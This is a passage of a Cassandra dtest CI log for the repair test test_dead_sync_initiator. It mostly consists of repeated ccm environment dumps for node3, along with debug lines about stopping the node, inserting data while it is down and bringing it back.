01:32:33 23:32:33,527 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/conf'}
01:32:33 23:32:33,527 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/conf'}
01:32:33 23:32:33,527 ccm INFO node3: using Java 8 for the current invocation
01:32:33 23:32:33,527 ccm INFO node3: using Java 8 for the current invocation
01:32:33 23:32:33,654 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:33 23:32:33,654 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:33 23:32:33,655 ccm INFO node3: using Java 8 for the current invocation
01:32:33 23:32:33,655 ccm INFO node3: using Java 8 for the current invocation
01:32:33 23:32:33,730 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:33 23:32:33,730 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:33 23:32:51,396 repair_tests.repair_test DEBUG stopping node3
01:32:51 23:33:04,482 cassandra.cluster INFO New Cassandra host <Host: 127.0.0.3:9042 datacenter1> discovered
01:33:04 23:33:04,482 cassandra.cluster INFO New Cassandra host <Host: 127.0.0.2:9042 datacenter1> discovered
01:33:04 23:33:04,537 repair_tests.repair_test DEBUG inserting data while node3 is down
01:33:04 23:33:15,237 repair_tests.repair_test DEBUG bring back node3
01:33:20 23:33:15,475 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/conf'}
01:33:20 23:33:15,475 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node3/bin/cassandra.in.sh', 